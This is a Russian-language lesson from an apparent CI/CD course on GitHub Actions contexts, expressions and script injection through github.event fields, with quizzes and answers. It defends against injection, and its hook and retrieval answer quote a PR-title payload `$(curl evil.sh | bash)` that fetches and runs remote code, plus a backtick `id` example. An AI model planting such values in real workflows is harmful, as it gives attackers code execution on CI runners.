---
concepts:
- ci-cd-gha-expressions
deepensInto: []
estMin: 16
lang: ru
lessonType: topic
level: senior
order: 2
prereqs: []
slug: "02-contexts-and-expressions"
sources:
- https://docs.github.com/en/actions/learn-github-actions/contexts
- https://docs.github.com/en/actions/learn-github-actions/expressions
- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
spiral: []
status: ready
title: "Контексты и выражения: модель данных и script injection через github.event"
summary: "Контексты (`github`, `env`, `secrets`, `needs`, `matrix`) — модель данных workflow; выражения в `${{ }}` фильтруют, ветвят и вычисляют. Интерполяция управляемого атакующим текста `github.event` прямо в `run:` — это удалённое выполнение кода."
track: "ci-cd"
unit: "08-workflows-deep"
---

import Hook from "~/components/lesson/Hook.astro";
import Explanation from "~/components/lesson/Explanation.astro";
import Recap from "~/components/lesson/Recap.astro";
import Inset from "~/components/lesson/Inset.astro";
import Crux from "~/components/prose/Crux.astro";
import KeyTakeaway from "~/components/prose/KeyTakeaway.astro";
import RetrievalDrawer from "~/components/pedagogy/RetrievalDrawer.tsx";
import Quiz from "~/components/pedagogy/Quiz.astro";
import FlowDiagram from "~/components/diagram/FlowDiagram.astro";

<Hook>
Proof-of-concept уместился в заголовок pull request. Исследователь безопасности открыл PR с заголовком `` $(curl evil.sh | bash) `` против популярного open-source проекта. У их CI был дружелюбный шаг «откомментировать автору заголовок PR обратно», делавший ровно то, на что похож: `echo "Thanks for PR: ${{ github.event.pull_request.title }}"`. GitHub интерполирует выражения `${{ }}` *до* того, как shell вообще увидит строку — поэтому раннер собрал `run:`-скрипт, буквально содержавший `echo "Thanks for PR: $(curl evil.sh | bash)"`, и shell послушно выполнил подстановку команды. Заголовок PR стал командой на раннере, с теми правами, что были у джоба. Лечением была не санитизация заголовка; лечением было — никогда не позволять управляемому атакующим тексту контекста становиться частью shell-команды. Выражения вычисляются на этапе шаблона — этот единственный факт и есть вся уязвимость, и вся защита.
</Hook>

<Crux>Контексты — модель данных; `${{ }}` вычисляется на этапе шаблона, поэтому `github.event` атакующего в `run:` — это инъекция.</Crux>

<Explanation>

## Контексты: где живут данные

Workflow читает всё, что знает, из **контекстов** — структурированных объектов, доступных внутри `${{ }}`:

```yaml
steps:
  - run: echo "commit ${{ github.sha }} on ${{ github.ref_name }}"
  - run: echo "build for ${{ matrix.os }}"
  - if: ${{ needs.build.result == 'success' }}
    run: ./deploy.sh
    env:
      TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

Контексты на каждый день: `github` (payload события, ref, sha, actor, repository), `env` (переменные workflow/job/step), `secrets` (зашифрованные значения, маскируемые в логах), `needs` (outputs и `result` вышестоящих джобов), `matrix` (текущая комбинация матрицы), `steps` (outputs предыдущих шагов в джобе), `runner`, `job`, `strategy`. **Доступность ограничена областью**: `secrets` нечитаем в job-level `if`; `needs` существует только после объявления ребра `needs:`; `matrix` существует только внутри матрицированного джоба. Чтение недоступного контекста даёт пустую строку, а не ошибку — поэтому опечатка `${{ secrets.DEPOLY_TOKEN }}` тихо аутентифицируется как никто, и деплой падает с непонятным 401, а не с ясным «undefined secret».

## Выражения: операторы, функции и truthiness

Внутри `${{ }}` доступен небольшой язык выражений: сравнения (`==`, `!=`, `<`, `>`), логика (`&&`, `||`, `!`) и функции — `contains()`, `startsWith()`, `format()`, `join()`, `fromJSON()`, `toJSON()`, `hashFiles()` и статус-проверки `success()`, `failure()`, `always()`, `cancelled()`. Доминируют две сеньорские ловушки:

- **`&&`/`||` возвращают операнды, а не булевы** — GitHub заимствует тернарную идиому `${{ condition && 'a' || 'b' }}` для выбора значения, потому что настоящего тернарника нет. Она работает, только когда «истинный» операнд сам truthy; `${{ x && '' || 'b' }}` всегда даёт `'b'`.
- **У `if:` неявный `${{ }}`** — пишешь `if: github.ref == 'refs/heads/main'` без скобок, но как только нужно выражение, начинающееся с `!`, его надо закавычить или взять в скобки, ведь YAML читает ведущий `!` как тег.

`fromJSON()` — силовой инструмент: он превращает JSON-строку в реальный объект, и так строится **динамическая матрица** — setup-джоб выдаёт JSON-массив как output, а нижестоящий джоб делает `strategy: { matrix: { include: ${{ fromJSON(needs.setup.outputs.list) }} } }`. Это превращает «решить, что тестировать, в рантайме» (изменённые пакеты, обнаруженные шарды) из невозможного в одну строку.

<Quiz
  id="02-contexts-and-expressions-quiz-1"
  lessonSlug="02-contexts-and-expressions"
  lang="ru"
  question="У шага env: VER: ${{ secrets.IS_PROD == 'true' && '1.0' || '0.9' }}, но сравнивать секреты здесь не стоит, и значение выходит '0.9' даже в проде. Какова наиболее вероятная корневая причина?"
  choices={[
    { label: "Сравнение читает недоступный или пустой контекст, поэтому левая сторона falsy, и тернарная идиома проваливается в ветку '0.9'", correct: true },
    { label: "GitHub вычисляет && как булево AND, возвращая true, что стрингифицируется в '0.9'", misconception: "&& не возвращает булево — он возвращает правый операнд, когда левый truthy, иначе левый. Провал в '0.9' случается, потому что левая сторона && оказалась falsy, а не из-за булевой коэрции." },
    { label: "Выражения не могут содержать строковые литералы, поэтому '1.0' невалиден и игнорируется", misconception: "Строковые литералы в одинарных кавычках полностью валидны в выражениях. Проблема в truthiness результата сравнения, а не в поддержке литералов." },
    { label: "secrets никогда не читаемы внутри env, поэтому всё выражение — синтаксическая ошибка", misconception: "secrets читаемы в env на большинстве событий; выражение синтаксически корректно. Недоступное/пустое значение вычисляется falsy, и побеждает ветка || — тихо, а не ошибкой." },
  ]}
/>

<Inset kind="why" lang="ru">
Почему GitHub вычисляет `${{ }}` до shell, а не передаёт контекст через переменные окружения по умолчанию? Потому что выражения должны управлять и тем, что не shell — условиями `if:`, значениями `matrix`, inputs `with:`, именами джобов — всё разрешается на этапе сборки шаблона по всему YAML. Цена этой однородности в том, что строка `run:` — лишь строка, которую движок собирает подстановкой, а подставленный текст атакующего становится кодом. Безопасный паттерн — разорвать цепочку: привязать контекст к переменной `env:` (`env: { TITLE: ${{ github.event.pull_request.title }} }`) и ссылаться на `"$TITLE"` в скрипте, чтобы значение шло как данные через окружение, а shell никогда не парсил его как исходник.
</Inset>

## Класс инъекций и его единственный фикс

Уязвимость Hook — целый класс: любая строка `run:`, интерполирующая контекст, на который может влиять атакующий — `github.event.*.title`, `*.body`, `*.head.ref`, сообщения коммитов, `head_commit.message`, тела ревью — это sink для script injection. Фикс механичен и полон: **никогда не клади управляемый атакующим `${{ }}` прямо в `run:`; передай его через `env:` и ссылайся на переменную окружения, закавыченную.**

```yaml
# НЕБЕЗОПАСНО: title интерполируется в скрипт, который собирает раннер
- run: echo "title: ${{ github.event.pull_request.title }}"

# БЕЗОПАСНО: значение идёт как данные; shell видит переменную, не исходник
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "title: $PR_TITLE"
```

Первая форма позволяет заголовку `` `id` `` выполнить команду; вторая печатает бэктики буквально. Больше ничего не меняется — те же данные, другая граница доверия.

<Quiz
  id="02-contexts-and-expressions-quiz-2"
  lessonSlug="02-contexts-and-expressions"
  lang="ru"
  question={"Почему передача github.event.pull_request.body через переменную env: и ссылка на \"$BODY\" в run: побеждает script injection, тогда как echo ${{ github.event.pull_request.body }} напрямую — нет?"}
  choices={[
    { label: "Прямая интерполяция случается на этапе шаблона, поэтому body становится частью исходника shell; через env body — это значение окружения, которое shell читает как данные, никогда не парся как команды", correct: true },
    { label: "Переменные окружения автоматически санитизируются, и shell-метасимволы вырезаются", misconception: "Ничего не вырезается — body сохраняет свои бэктики и $() дословно. Они безвредны лишь потому, что как значение env shell трактует их как литеральный текст, а не из-за санитизации." },
    { label: "Форма env: выполняется в отдельном ограниченном shell, не способном выполнять команды", misconception: "Тот же shell, те же возможности. Разница лишь в том, собирается ли текст атакующего в исходник скрипта (небезопасно) или читается в рантайме как значение переменной (безопасно)." },
    { label: "${{ }} не может стоять под env:, поэтому небезопасное выражение там не разрешается", misconception: "${{ }} прекрасно разрешается в значениях env: — это и есть безопасный паттерн. body интерполируется в переменную, а не в командную строку." },
  ]}
/>

</Explanation>

<FlowDiagram
  label="Контексты питают движок выражений на этапе шаблона, затем собранная run-строка отдаётся shell — привязка к env уводит текст атакующего с пути исходника"
  hue="var(--d-backend)"
  perRow={3}
  nodes={[
    { id: "ctx", label: "Контексты", sub: "github / needs / matrix" },
    { id: "expr", label: "Вычисление выражений", sub: "${{ }} на этапе шаблона" },
    { id: "direct", label: "Прямо в run:", sub: "подстановка строки" },
    { id: "envbind", label: "Привязка к env:", sub: "значение как данные" },
    { id: "shell", label: "Shell", sub: "парсит исходник" },
    { id: "rce", label: "Инъекция", sub: "title → команда" },
  ]}
  edges={[
    { from: "ctx", to: "expr", label: "чтение" },
    { from: "expr", to: "direct", label: "интерполяция" },
    { from: "expr", to: "envbind", label: "интерполяция" },
    { from: "direct", to: "shell", label: "стал исходником" },
    { from: "shell", to: "rce", label: "$(...) выполняется" },
    { from: "envbind", to: "shell", label: "$VAR читается" },
  ]}
  caption="Одно и то же значение контекста безопасно или фатально в зависимости от пути: интерполированное в исходник run: оно становится кодом; привязанное к переменной env: и читаемое как $VAR — остаётся данными."
/>

<KeyTakeaway>Контексты (`github`, `env`, `secrets`, `needs`, `matrix`, `steps`) — модель данных workflow, доступная внутри `${{ }}` с ограниченной областью видимости — чтение недоступного контекста даёт пустую строку, поэтому опечатанный секрет тихо проваливается закрытым. В языке выражений `&&`/`||` возвращают операнды, а не булевы (тернарная идиома), у `if:` неявный `${{ }}`, а `fromJSON()` превращает рантайм-JSON-строку в динамическую матрицу. Определяющий риск: `${{ }}` вычисляется на этапе шаблона, поэтому интерполяция управляемого атакующим текста `github.event` в строку `run:` — это удалённое выполнение кода. Единственный фикс — привязать такие значения к `env:` и ссылаться на закавыченную переменную, держа текст атакующего как данные, никогда не исходник.</KeyTakeaway>

<RetrievalDrawer
  client:visible
  id="02-contexts-and-expressions-retrieval"
  lang="ru"
  questions={[
    { q: "Объясни механизм script injection в шаге run: и точную митигацию, в терминах того, когда вычисляются выражения.", a: "GitHub вычисляет выражения ${{ }} на этапе сборки шаблона, до того как раннер отдаёт блок run: в shell. Поэтому строка вроде echo \"${{ github.event.pull_request.title }}\" сначала превращается в литеральный shell-скрипт с подставленным заголовком. Если заголовок `$(curl evil|bash)`, собранный скрипт содержит эту подстановку команды, и shell её выполняет — удалённое выполнение кода с правами джоба. Митигация — держать управляемый атакующим контекст вне пути исходника: привязать его к переменной env: (env: { PR_TITLE: ${{ github.event.pull_request.title }} }) и ссылаться на \"$PR_TITLE\" в run:. Теперь значение идёт через окружение как данные; shell читает его как значение переменной в рантайме и никогда не парсит содержимое как команды. Те же данные, другая граница доверия." },
    { q: "Для чего нужен fromJSON и почему && и || ведут себя необычно в выражениях?", a: "fromJSON парсит JSON-строку в реальный объект/массив, давая динамическую матрицу: setup-джоб вычисляет список в рантайме (изменённые пакеты, обнаруженные шарды), выдаёт его как JSON-строку output, а нижестоящий джоб ставит matrix.include в ${{ fromJSON(needs.setup.outputs.list) }}, превращая рантайм-решения в ноги матрицы. && и || не возвращают булевы — они возвращают один из операндов: && даёт правый операнд, если левый truthy, иначе левый; || даёт первый truthy операнд. Это питает тернарную идиому ${{ cond && 'a' || 'b' }}, но ломается, когда «истинное» значение само falsy (напр., пустая строка), ведь || тогда проваливается в 'b'. Чтение недоступного контекста даёт пустую (falsy) строку — частая тихая причина победы не той ветки." },
  ]}
/>

<Recap lang="ru">
Контексты — вся модель данных workflow: `github` несёт payload события, ref, sha и actor; `env`, `secrets`, `needs`, `matrix`, `steps`, `runner` и `job` несут остальное — всё читаемо внутри `${{ }}` с областью видимости, ограниченной местами, где они осмысленны, а отсутствующий контекст разрешается в пустую строку, а не в ошибку, так что опечатанный секрет проваливается закрытым и тихо. Язык выражений даёт сравнения, логику и функции вроде `contains`, `format`, `hashFiles`, статус-проверки `success`/`failure`/`always`/`cancelled` и `fromJSON` — силовой инструмент, парсящий рантайм-JSON-строку в динамическую матрицу, чтобы setup-джоб решал в рантайме, какие ноги тестов. Две причуды кусают сеньоров: `&&`/`||` возвращают операнды, а не булевы — тернарная идиома `${{ cond && 'a' || 'b' }}` проваливается, когда истинный операнд falsy — и у `if:` неявный `${{ }}`, конфликтующий с тегом `!` в YAML. Определяющая опасность — тайминг: `${{ }}` вычисляется на этапе сборки шаблона, до того как shell увидит строку `run:`, поэтому любой управляемый атакующим контекст — заголовки PR, тела, имена веток, сообщения коммитов — интерполированный прямо в `run:`, становится исходником shell и выполняется. Полный механический фикс — привязать такие значения к переменной `env:` и ссылаться на закавыченный `$VAR`, чтобы текст атакующего пересекал границу как данные, а shell никогда не парсил его как команду.
</Recap>
